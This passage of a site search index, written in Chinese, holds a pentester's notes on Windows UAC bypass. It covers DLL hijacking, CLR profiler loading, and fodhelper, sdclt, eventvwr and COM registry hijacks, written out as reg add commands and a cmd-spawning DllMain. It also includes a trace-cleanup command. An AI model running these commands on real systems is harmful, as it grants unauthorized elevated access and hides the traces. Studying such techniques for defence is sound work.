\u5982\u679c\u6211\u4eec\u5728\u5e94\u7528\u7a0b\u5e8f\u627e\u5230\u6b63\u786e\u7684dll\u4e4b\u524d\uff0c\u5c06\u6211\u4eec\u81ea\u5df1\u521b\u9020\u7684dll\u653e\u5165\u4f18\u5148\u7ea7\u66f4\u9ad8\u7684\u641c\u7d22\u76ee\u5f55\u8ba9\u5e94\u7528\u7a0b\u5e8f\u4f18\u5148\u52a0\u8f7d\u6b64dll\u6587\u4ef6\uff0c\u8fd9\u5c31\u9020\u6210\u4e86dll\u52ab\u6301\u3002\u4f46\u8fd9\u53ea\u662fdll\u52ab\u6301\u7684\u5176\u4e2d\u4e00\u79cd\u9014\u5f84\uff0c\u4ed6\u6709\u8fd9\u4e9b\u9014\u5f84\uff1a \uff081\uff09 DLL\u66ff\u6362\uff1a\u7528\u6076\u610f\u7684DLL\u66ff\u6362\u6389\u5408\u6cd5\u7684DLL \uff082\uff09 DLL\u641c\u7d22\u987a\u5e8f\u52ab\u6301\uff1a\u5f53\u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7dDLL\u7684\u65f6\u5019\uff0c\u5982\u679c\u6ca1\u6709\u5e26\u6307\u5b9aDLL\u7684\u8def\u5f84\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u4f1a\u4ee5\u7279\u5b9a\u7684\u987a\u5e8f\u4f9d\u6b21\u5728\u6307\u5b9a\u7684\u8def\u5f84\u4e0b\u641c\u7d22\u5f85\u52a0\u8f7d\u7684DLL\u3002\u901a\u8fc7\u5c06\u6076\u610fDLL\u653e\u5728\u771f\u5b9eDLL\u4e4b\u524d\u7684\u641c\u7d22\u4f4d\u7f6e\uff0c\u5c31\u53ef\u4ee5\u52ab\u6301\u641c\u7d22\u987a\u5e8f\uff0c\u52ab\u6301\u7684\u76ee\u5f55\u6709\u65f6\u5019\u5305\u62ec\u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u76ee\u5f55\u3002 \uff083\uff09 \u865a\u62dfDLL\u52ab\u6301\uff1a\u91ca\u653e\u4e00\u4e2a\u6076\u610f\u7684DLL\u6765\u4ee3\u66ff\u5408\u6cd5\u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7d\u7684\u4e22\u5931/\u4e0d\u5b58\u5728\u7684DLL \uff084\uff09 DLL\u91cd\u5b9a\u5411\uff1a\u66f4\u6539DLL\u641c\u7d22\u7684\u8def\u5f84\uff0c\u6bd4\u5982\u901a\u8fc7\u7f16\u8f91%PATH%\u73af\u5883\u53d8\u91cf\u6216 .exe.manifest/.exe.local\u6587\u4ef6\u4ee5\u5c06\u641c\u7d22\u8def\u5f84\u5b9a\u4f4d\u5230\u5305\u542b\u6076\u610fDLL\u7684\u5730\u65b9\u3002 \uff085\uff09 WinSxS DLL\u66ff\u6362\uff1a\u5c06\u76ee\u6807DLL\u76f8\u5173\u7684WinSxS\u6587\u4ef6\u5939\u4e2d\u7684\u6076\u610fDLL\u66ff\u6362\u4e3a\u5408\u6cd5\u7684DLL\u3002\u6b64\u65b9\u6cd5\u901a\u5e38\u4e5f\u88ab\u79f0\u4e3aDLL\u4fa7\u52a0\u8f7d \uff086\uff09 \u76f8\u5bf9\u8def\u5f84DLL\u52ab\u6301\uff1a\u5c06\u5408\u6cd5\u7684\u5e94\u7528\u7a0b\u5e8f\u590d\u5236\uff08\u5e76\u6709\u9009\u62e9\u5730\u91cd\u547d\u540d\uff09\u4e0e\u6076\u610f\u7684DLL\u4e00\u8d77\u653e\u5165\u5230\u7528\u6237\u53ef\u5199\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u5728\u4f7f\u7528\u65b9\u6cd5\u4e0a\uff0c\u5b83\u4e0e\uff08\u7b7e\u540d\u7684\uff09\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\u6709\u76f8\u4f3c\u4e4b\u5904\u3002\u5b83\u7684\u4e00\u4e2a\u53d8\u4f53\u662f\uff08\u6709\u70b9\u77db\u76fe\u5730\u79f0\u4e3a\uff09\u201c\u81ea\u5e26LOLbin\u201d\uff0c\u5176\u4e2d\u5408\u6cd5\u7684\u5e94\u7528\u7a0b\u5e8f\u5e26\u6709\u6076\u610f\u7684DLL\uff08\u800c\u4e0d\u662f\u4ece\u53d7\u5bb3\u8005\u673a\u5668\u4e0a\u7684\u5408\u6cd5\u4f4d\u7f6e\u590d\u5236\uff09\u3002","title":"DLL\u52ab\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#1","text":"\u8fd9\u91cc\u6211\u4eec\u5148\u7528\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6765\u8fdb\u884c\u5b9e\u9a8c\uff0c\u5b9e\u9a8c\u5bf9\u8c61\u662fC:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe\u548cListary\u3002Listary\u662f\u4e00\u4e2a\u5f88\u597d\u7528\u7684\u68c0\u7d22\u5c0f\u5de5\u5177\uff0c\u6211\u901a\u8fc7processmonitor\uff0c\u8bbe\u7f6e\u597d\u8fc7\u6ee4\u6761\u4ef6\uff0c\u67e5\u770bSystemPropertiesAdvanced.exe\u8c03\u7528\u7684dll\u65f6\u53d1\u73b0\u5b83\u4f1a\u8c03\u7528\u4e00\u4e2aListary\u4e0b\u7684\u4e00\u4e2a\u540d\u4e3aListaryHook.dll\u7684dll\u3002 \u7531\u4e8elistary\u76ee\u5f55\u6743\u9650\u4e0d\u9ad8\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u66ff\u6362\u8be5dll\uff0c\u6362\u6210dllmain\u4e3a\u6253\u5f00cmd\u7684dll\u3002\u7136\u540e\u70b9\u51fb\u8fd0\u884cSystemPropertiesAdvanced.exe\uff0c\u5c31\u4f1a\u53d1\u73b0\u4f1a\u5f39\u51fa\u9ad8\u6743\u9650cmd\u7a97\u53e3 bypassuac\u6210\u529f\u3002 \u5f53\u7136\u8fd9\u79cd\u90fd\u4e0d\u80fd\u7b97\u662f\u4e00\u4e2a\u6d1e\uff0clistary\u5e76\u4e0d\u662f\u4eba\u4eba\u7535\u8111\u4e0a\u90fd\u6709\u7684\uff0c\u800c\u4e14\u8fd9\u4e2a\u8f6f\u4ef6\u88c5\u673a\u91cf\u5e94\u8be5\u662f\u6781\u5c11\u6570\u5c11\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ea\u662f\u63d0\u4f9b\u4e00\u4e2a\u601d\u8def\uff0c\u8fd9\u79cd\u6d1e\u8be5\u600e\u4e48\u53bb\u627e\u3002","title":"\u5b9e\u8df5\u51fa\u771f\u77e51"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#2","text":"\u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e09\u79cd\u65b9\u6cd5\u8fdb\u884c\u5b9e\u9a8c\uff0c\u5b9e\u9a8c\u5bf9\u8c61\u662feventvwr.msc\uff0c\u5b83\u662f\u7ba1\u7406\u5de5\u5177\u4e2d\u7684\u4e8b\u4ef6\u67e5\u770b\u5668\uff0c\u5b83\u4f9d\u8d56\u4e8emmc.exe\u6765\u8fd0\u884c\u3002\u6bd4\u5982\uff0c\u4f60\u60f3\u8fd0\u884c\u5b83\uff0c\u5c31\u5f97\u901a\u8fc7mmc eventvwr.msc\u6765\u8fd0\u884c\u5b83,\u5e76\u4e14\u5728process exploer\u4e2d\u53ea\u80fd\u770b\u5230\u4e2ammc.exe\u3002 \u6211\u4eecprocess monitor\u8bbe\u7f6e\u8fc7\u6ee4\u5982\u4e0b cmd\u8fd0\u884c mmc eventvwr.msc,\u67e5\u770b\u8c03\u7528 dll\u641c\u7d22\u987a\u5e8f\u786e\u5b9e\u662f \u7a0b\u5e8f\u76ee\u5f55->SYSTEM32->SYSTEM->WINDOWS->\u5f53\u524d\u76ee\u5f55\uff08\u8fd9\u91cc\u4e5f\u662fSYSTEM32\u76ee\u5f55\uff0c\u6211\u8ba4\u4e3a\u7684\u539f\u56e0\u662fmmc\u4f1a\u81ea\u52a8\u63d0\u5347\u6743\u9650\u5bfc\u81f4\u5f53\u524d\u76ee\u5f55\u4e3aSystem32\u5bfc\u81f4\u7684\uff09->PATH\u76ee\u5f55\u3002 \u6211\u4eec\u53ea\u9700\u5728\u53ef\u5199\u76ee\u5f55\u4e0b\u690d\u5165\u540d\u4e3aelsext.dll\u7684\u6076\u610fdll\uff0c\u5904\u7406\u597ddll\u7684dllmain\u51fd\u6570\uff0c\u5c31\u80fd\u8ba9dllmain\u91cc\u7684\u6307\u4ee4\u88ab\u9ad8\u6743\u9650\u6267\u884c \u4f46\u662f\u65e0\u5948\u6211\u8fd9\u91cc\u73af\u5883\u662fwin7 sp1,\u4f46\u662f\u8fd9\u4e2a\u6d1e7600\u624d\u51fa\u73b0\uff0c\u6240\u4ee5\u590d\u73b0\u4e0d\u4e86\u4e86\u3002\u4f46\u5927\u6982\u601d\u8def\u5c31\u662f\u8fd9\u6837\u7684","title":"\u5b9e\u8df5\u51fa\u771f\u77e52"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#clrdll","text":"CLR\u662f\u5fae\u8f6f\u4e3a.net\u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u73af\u5883\uff0c\u50cfjava\u7684\u865a\u62df\u673a\u4e00\u6837\uff0c\u800cclr\u6709\u4e00\u4e2aProfiling\u673a\u5236\u3002\u8fd9\u4e2a\u673a\u5236\u7b80\u800c\u8a00\u4e4b\u4fbf\u662f\u53ef\u4ee5\u7ed9CLR\u63d0\u4f9b\u4e00\u4e2adll\uff0c\u5f53\u4efb\u4f55\u9ad8\u6743\u9650.NET\u8fd0\u884c\u65f6\u90fd\u4f1a\u4e3b\u52a8\u52a0\u8f7d\u8be5DLL\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u6076\u610fdll\u7ed9CLR\u52a0\u8f7d\uff0c\u4ece\u800c\u83b7\u5f97\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u5982cmd\uff0c\u4ece\u800cbypassuac\u3002 \u81f3\u4e8e\u8fd9\u4e2adll\u5982\u4f55\u7ed9CLR\uff0c\u662f\u901a\u8fc7\u4fee\u6539\u4ee5\u4e0b\u73af\u5883\u53d8\u91cf\u5b9e\u73b0\u7684 COR_ENABLE_PROFILING = 1 COR_PROFILER={CLSIDor ProgID} CLR\u4f1a\u68c0\u67e5\u73af\u5883\u53d8\u91cf\u4e2d\u7684COR_ENABLE_PROFILING\uff0c\u82e5\u4e3a1\u5219\u68c0\u67e5\u901a\u8fc7\uff0c\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002 \u5728net4.0\u4ee5\u524d\uff0c\u82e5\u68c0\u67e5\u901a\u8fc7\uff0c\u4f1a\u9a6c\u4e0a\u53bb\u67e5\u627eCOR_PROFILER\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\uff0c\u627e\u5230\u5176dll\u8def\u5f84\u5e76\u52a0\u8f7d net4.0\u540e\uff0c\u4f1a\u5148\u67e5\u627eCOR_PROFILER_PATH\u662f\u5426\u6307\u5b9adll\u6587\u4ef6\u8def\u5f84\uff0c\u82e5\u6ca1\u6709\u518d\u53bb\u67e5\u627eCOR_PROFILER\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\uff0c\u627e\u5230\u5176dll\u8def\u5f84\u5e76\u52a0\u8f7d\u3002 \u603b\u800c\u8a00\u4e4b\uff0c\u6211\u4eec\u8bbe\u7f6e\u597dCOR_ENABLE_PROFILING\u548cCOR_PROFILER\u4e24\u4e2a\u9879\u5c31\u53ef\u4ee5\u4e86\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8bbe\u7f6e\u7528\u6237\u73af\u5883\u53d8\u91cf\uff0c\u8bbe\u7f6e\u7528\u6237\u73af\u5883\u53d8\u91cf\u65f6\u4e0d\u9700\u8981\u9ad8\u6743\u9650\uff08win10\u4f3c\u4e4e\u8bbe\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u4e5f\u4e0d\u9700\u8981\uff09\u3002 \u4ee5\u53ca\u5728\u6ce8\u518c\u8868\uff0c\u5728\u6307\u5b9a\u7684CLSID\u5c5e\u6027\u4e0b\u65b0\u5efaInprocserver32\u9879\uff0c\u5e76\u5199\u5165\u6076\u610fdll\u8def\u5f84. \u7136\u540e\u901a\u8fc7mmc\u8c03\u7528\u4e00\u4e0bgpedit.msc\u8fd9\u79cd\u7a0b\u5e8f\uff0c\u5373\u53ef\u4ee5\u9ad8\u6743\u9650\u6267\u884cdll\u3002\u5982\u679cdll\u6267\u884c\u547d\u4ee4\u4e3asystem(\"cmd.exe\") \u90a3\u4e48\u5c31\u4f1a\u8e66\u51fa\u6765\u9ad8\u6743\u9650cmd\u7a97\u53e3 REG ADD \"HKCU\\Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\\InprocServer32\" /ve /t REG_EXPAND_SZ /d \"C:\\test\\calc.dll\" /f REG ADD \"HKCU\\Environment\" /v \"COR_PROFILER\" /t REG_SZ /d \"{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\" /f REG ADD \"HKCU\\Environment\" /v \"COR_ENABLE_PROFILING\" /t REG_SZ /d \"1\" /f mmc gpedit.msc \u4f46\u6211\u6b7b\u6d3b\u590d\u73b0\u4e0d\u8d77\u4e0d\u77e5\u9053\u4e3a\u5565\uff0c\u6211\u7684dll\u8fd9\u6837\u5199\u7684 // dllmain.cpp : \u5b9a\u4e49 DLL \u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002 #include \"pch.h\" #include <iostream> #include <Windows.h> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { char cmd[] = \"cmd.exe\"; switch (fdwReason) { case DLL_PROCESS_ATTACH: WinExec(cmd, SW_SHOWNORMAL); ExitProcess(0); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } \u53e6\u5916\u7684\uff0c\u4f60\u8fd8\u53ef\u4ee5\u4e3aCOR_PROFILER_PATH\u8bbe\u7f6e\u4e3a\u5982\\\\server\\share\\test.dll\u7684smb\u7684\u8def\u5f84\uff0c\u8fd9\u6837\u4e5f\u53ef\u4ee5\u5b9e\u73b0bypassuac\uff08\u6ca1\u590d\u73b0\uff09","title":"CLR\u52a0\u8f7d\u4efb\u610fDLL"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#_3","text":"","title":"\u767d\u540d\u5355\u7a0b\u5e8f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#odbcad32exe","text":"\u8fd9\u4e2a\u65b9\u6cd5\u5f88\u7b80\u5355\u3002\u6253\u5f00C:\\Windows\\system32\\odbcad32.exe\uff0c\u7136\u540e\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u6253\u5f00powershell\u6216\u8005cmd \u6210\u529fbypass","title":"odbcad32.exe"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#_4","text":"\u4e4b\u524d\u8bf4\u8fc7\uff0c\u7ba1\u7406\u5de5\u5177\u6709\u5f88\u591a\u767d\u540d\u5355\u7a0b\u5e8f\uff0c\u5982\u679c\u4e00\u4e2a\u767d\u540d\u5355\u7a0b\u5e8f\u6709\u6d4f\u89c8\u6587\u4ef6\u76ee\u5f55\u7684\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u4ee5\u6b64\u6765\u521b\u5efa\u9ad8\u6743\u9650cmd\u7a97\u53e3\u3002\u8fd9\u91cc\u62ff\u4e8b\u4ef6\u67e5\u770b\u5668\u4e3e\u4f8b \u64cd\u4f5c-\u300b\u6253\u5f00\u4fdd\u5b58\u7684\u76ee\u5f55-\u300b\u6587\u4ef6\u76ee\u5f55\u8def\u5f84\u5904\u8f93\u5165powershell-\u300b\u5f39\u51fa\u9ad8\u6743\u9650powershell \u4ee5\u6b64\u5185\u63a8\uff0c\u8fd8\u6709\u5f88\u591a\u76f8\u4f3c\u7684\u7ba1\u7406\u5de5\u5177\u53ef\u4ee5\u8fd9\u6837\u5229\u7528","title":"\u7ba1\u7406\u5de5\u5177"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#_5","text":"","title":"\u6ce8\u518c\u8868\u52ab\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#fodhelperexe","text":"Fodhelper.exe win10\u624d\u6709\uff0c\u6240\u4ee5\u53ea\u6709win10\u80fd\u901a\u8fc7\u8fd9\u4e2a\u529e\u6cd5bypassuac\uff0c\u4ed6\u662f\u4e00\u4e2aautoelevate\u5143\u7d20\u7a0b\u5e8f \u6211\u4eec\u4f7f\u7528proceemonitor\u67e5\u770b\u4e8b\u4ef6\u67e5\u770b\u5668\u542f\u52a8\u7684\u65f6\u5019\u6267\u884c\u4e86\u4ec0\u4e48\u3002\u6211\u4eec\u901a\u8fc7\u6392\u67e5\u53d1\u73b0\u4e86\u6b64\u5904 \u53d1\u73b0\u7a0b\u5e8f\u8bd5\u56fe\u6253\u5f00HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\uff0c\u4f46\u662f\u8fd9\u4e2a\u9879\u6ca1\u6709\u627e\u5230\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u9879\u5e76\u4e0d\u5b58\u5728\uff0c\u4e8e\u662f\u5b83\u67e5\u8be2 HKCR\\ms-settings\\Shell\\Open,\u67e5\u8be2\u6210\u529f\u4fbf\u6253\u5f00\u5176\u4e0b\u7684Command\u952e\u8fdb\u884c\u67e5\u8be2\u3002 \u6211\u4eec\u53ef\u4ee5\u52ab\u6301\u6ce8\u518c\u8868\uff0c\u5f80HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\u5199\u5165\u6076\u610f\u6307\u4ee4\u4ece\u800c\u8fbe\u5230bypassuac\u7684\u76ee\u7684\u3002 reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f \u6211\u4eec\u5199\u5165\u5982\u4e0b\u547d\u4ee4\uff0c\u5c31\u80fd\u8ba9Fodhelper.exe \u6267\u884c\u65f6\u81ea\u52a8\u9ad8\u6743\u9650\u6267\u884ccmd\u7a97\u53e3\u4e86 \u7136\u540e\u6d88\u9664\u75d5\u8ff9 reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\"","title":"Fodhelper.exe"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#sdclt","text":"Win10\u540e\u8fd9\u4e2a\u7a0b\u5e8f\u624d\u6709\u81ea\u52a8\u63d0\u5347\u6743\u9650\u7684\u80fd\u529b reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /d C:\\Windows\\System32\\cmd.exe /f reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /v \"DelegateExecute\" /f","title":"sdclt"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#eventvmr","text":"reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d C:\\Windows\\System32\\cmd.exe /f win10\uff0cwin7\u5747\u65e0\u6548,\u4e0d\u77e5\u9053\u662f\u54ea\u4e2a\u7248\u672c\u7684\u4e8b\u4e86\uff0c\u53cd\u6b63\u8bb0\u5f55\u4e0b\u6765\u5427\u3002","title":"eventvmr"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#com","text":"\u548cdll\u52ab\u6301\u7c7b\u4f3c\uff0c\u5e94\u7528\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u4e5f\u4f1a\u53bb\u52a0\u8f7d\u6307\u5b9aCLSID\u7684COM\u7ec4\u4ef6\uff0c\u5176\u52a0\u8f7d\u987a\u5e8f\u5982\u4e0b HKCU\\Software\\Classes\\CLSID HKCR\\CLSID HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ \u4ee5eventvwr\u4e3a\u4f8b \u6267\u884c\u8be5\u7a0b\u5e8f\u65f6\u4f1a\u53bb\u5bfb\u627e{0A29FF9E-7F9C-4437-8B11-F424491E3931}\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u53c8\u9700\u8981\u52a0\u8f7dInProcServer32\u6307\u5b9a\u7684DLL\uff0c\u800c\u8fd9\u4e2aDLL\u7684\u8def\u5f84\u53ef\u7531\u7528\u6237\u5b9a\u4e49\u3002 \u800ceventvwr\u7684\u8fd9\u4e2a\u7ec4\u4ef6\u4e00\u822c\u5728HKCR\\CLSID\u627e\u5230\uff0c\u6240\u4ee5\u53ef\u4ee5\u641c\u7d22\u8def\u5f84\u52ab\u6301\u3002 \u5229\u7528\u4ee5\u4e0b\u65b9\u6cd5\u53ef\u4ee5\u52ab\u6301\uff08\u641c\u7d22\u8def\u5f84\u52ab\u6301\uff09 reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32 /v \"\" /t REG_SZ /d \"d:\\msf_x64.dll\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32 /v \"LoadWithoutCOM\" /t REG_SZ /d \"\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32 /v \"ThreadingModel\" /t REG_SZ /d \"Apartment\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder /v \"HideOnDesktop\" /t REG_SZ /d \"\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder /v \"Attributes\" /t REG_DWORD /d 0xf090013d /f","title":"COM\u52ab\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#com_1","text":"","title":"\u5229\u7528com\u63a5\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#icmluautil","text":"","title":"ICMLuaUtil"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#uacme","text":"\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee\uff0c\u8bb0\u5f55\u4e86\u8bb8\u591aBypassuac\u7684\u65b9\u6cd5\u3002 https://github.com/hfiref0x/UACME/tree/v3.2.x","title":"UACME"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#windbg","text":"\u5927\u5bb6\u81ea\u5df1\u627e\u8d44\u6599\u73a9\uff0c\u56e0\u4e3a\u6211\u4e5f\u4e0d\u4f1a","title":"windbg\u8c03\u8bd5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/","text":"Windows\u4e0b\u53ef\u63d0\u6743\u7684\u4e5d\u79cd\u6743\u9650 https://3gstudent.github.io/\u6e17\u900f\u6280\u5de7-Windows\u4e5d\u79cd\u6743\u9650\u7684\u5229\u7528","title":"Windows\u4e0b\u53ef\u63d0\u6743\u7684\u4e5d\u79cd\u6743\u9650"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/#windows","text":"https://3gstudent.github.io/\u6e17\u900f\u6280\u5de7-Windows\u4e5d\u79cd\u6743\u9650\u7684\u5229\u7528","title":"Windows\u4e0b\u53ef\u63d0\u6743\u7684\u4e5d\u79cd\u6743\u9650"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/","text":"Windows\u63d0\u6743 \u76ee\u5f55 \u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84 \uff08 Trusted Service Paths \uff09 \u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\uff08Vulnerable Services \uff09 AlwaysInstallElevated \u4fe1\u606f\u6cc4\u9732 \u57fa\u4e8e\u8d44\u6e90\u7684\u57df\u59d4\u6d3e\u653b\u51fb \u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a \u653b\u51fb\u6d41\u7a0b: \u5b9e\u64cd \u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7 POTATO \u5bb6\u65cf hot potato MYSQL\u4e0b\u7684\u63d0\u6743\u6280\u672f MOF\u63d0\u6743 UDF\u63d0\u6743 \u542f\u52a8\u9879\u63d0\u6743 \u547d\u540d\u7ba1\u9053\u63d0\u6743 